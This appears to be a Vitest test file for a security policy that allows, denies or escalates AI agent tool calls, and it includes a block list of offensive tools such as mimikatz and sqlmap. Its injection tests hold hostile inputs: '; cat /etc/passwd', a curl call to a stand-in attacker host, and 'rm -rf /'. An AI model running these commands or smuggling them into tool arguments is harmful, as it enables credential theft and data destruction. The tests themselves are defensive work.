import { describe, expect, it } from 'vitest';
import { evaluateGenXSecurityEvent, isGenXOffensiveTool } from './genxPolicy';

const base = { agentId: 'agent-test', principal: 'user-test', toolName: 'system_diagnostics', action: 'READ' as const };

describe('Gen-X deterministic security enforcement', () => {
  it('allows known read-only diagnostics', () => {
    expect(evaluateGenXSecurityEvent(base).decision).toBe('ALLOW');
  });
  it.each(['nmap', 'sqlmap', 'metasploit', 'hydra', 'mimikatz', 'masscan'])('blocks offensive tool %s', (toolName) => {
    expect(isGenXOffensiveTool(toolName)).toBe(true);
    expect(evaluateGenXSecurityEvent({ ...base, toolName }).decision).toBe('DENY');
  });
  it('blocks command execution', () => {
    expect(evaluateGenXSecurityEvent({ ...base, toolName: 'execute_shell_command', action: 'EXECUTE' }).decision).toBe('DENY');
  });
  it('blocks credential access', () => {
    expect(evaluateGenXSecurityEvent({ ...base, action: 'CREDENTIAL_ACCESS', target: 'vault' }).decision).toBe('DENY');
  });
  it('requires approval for network and write actions', () => {
    expect(evaluateGenXSecurityEvent({ ...base, action: 'NETWORK' }).decision).toBe('REQUIRE_APPROVAL');
    expect(evaluateGenXSecurityEvent({ ...base, action: 'UPDATE' }).decision).toBe('REQUIRE_APPROVAL');
  });
  it('blocks autonomous production deletion', () => {
    expect(evaluateGenXSecurityEvent({ ...base, action: 'DELETE', environment: 'production' }).decision).toBe('DENY');
  });

  it("allows verified human deletion of the user's own Memory Vault record in production only", () => {
    expect(evaluateGenXSecurityEvent({
      ...base, agentId: 'ryanai-api', toolName: 'api_user_memory',
      principal: 'verified-user-id', target: 'self', action: 'DELETE',
      environment: 'production', actorType: 'human',
    })).toMatchObject({ decision: 'ALLOW', ruleId: 'GX-HUMAN-MEMORY-001' });

    expect(evaluateGenXSecurityEvent({
      ...base, toolName: 'agent_memory_delete', action: 'DELETE',
      environment: 'production', actorType: 'agent',
    })).toMatchObject({ decision: 'DENY', ruleId: 'GX-PROD-DELETE-001' });
  });

  it('denies unknown tools by default', () => {
    expect(evaluateGenXSecurityEvent({ ...base, toolName: 'unknown_future_tool' }).decision).toBe('REQUIRE_APPROVAL');
  });
  it('denies command-control payloads even when passed to an allowlisted read-only tool', () => {
    for (const target of ['report; cat /etc/passwd', '$(curl https://attacker.invalid)', 'safe\nrm -rf /']) {
      const result = evaluateGenXSecurityEvent({ ...base, toolName: 'read_workspace_file', target });
      expect(result.decision).toBe('DENY');
      expect(result.ruleId).toBe('GX-INJECTION-001');
    }
  });
  it('allows the public procurement data tool for reads only', () => {
    const procurement = { ...base, toolName: 'za_public_procurement_data' };
    expect(evaluateGenXSecurityEvent({ ...procurement, target: 'official-public-source-discovery' }).decision).toBe('ALLOW');
    expect(evaluateGenXSecurityEvent({ ...procurement, action: 'EXECUTE' }).decision).toBe('DENY');
    expect(evaluateGenXSecurityEvent({ ...procurement, action: 'NETWORK' }).decision).toBe('REQUIRE_APPROVAL');
    expect(evaluateGenXSecurityEvent({ ...procurement, action: 'CREDENTIAL_ACCESS' }).decision).toBe('DENY');
    expect(evaluateGenXSecurityEvent({ ...procurement, target: 'https://ocds-api.etenders.gov.za/vault' }).decision).toBe('DENY');
  });
  it('allows verified human actions only on their own Memory Vault records', () => {
    for (const action of ['READ', 'CREATE', 'UPDATE', 'DELETE'] as const) {
      expect(evaluateGenXSecurityEvent({
        ...base, agentId: 'ryanai-api', toolName: 'api_user_memory',
        principal: 'verified-user-id', target: 'self', action, actorType: 'human',
      })).toMatchObject({ decision: 'ALLOW', ruleId: 'GX-HUMAN-MEMORY-001' });
    }
    expect(evaluateGenXSecurityEvent({
      ...base, agentId: 'agent', toolName: 'api_user_memory',
      principal: 'verified-user-id', target: 'self', action: 'DELETE', actorType: 'agent',
    }).decision).toBe('REQUIRE_APPROVAL');
    expect(evaluateGenXSecurityEvent({
      ...base, agentId: 'ryanai-api', toolName: 'api_user_memory',
      principal: 'verified-user-id', target: 'another-user', action: 'READ', actorType: 'human',
    }).decision).toBe('REQUIRE_APPROVAL');
  });

  it('allows only the explicitly user-initiated configured reasoning network action', () => {
    expect(evaluateGenXSecurityEvent({
      ...base, agentId: 'ryanai-api', toolName: 'api_reasoning_request',
      principal: 'verified-user-id', target: 'configured-approved-provider',
      action: 'NETWORK', actorType: 'human',
    })).toMatchObject({ decision: 'ALLOW', ruleId: 'GX-HUMAN-REASONING-001' });
    expect(evaluateGenXSecurityEvent({
      ...base, agentId: 'ryanai-api', toolName: 'api_reasoning_request',
      principal: 'verified-user-id', target: 'https://arbitrary.example.test',
      action: 'NETWORK', actorType: 'human',
    }).decision).toBe('REQUIRE_APPROVAL');
  });

});
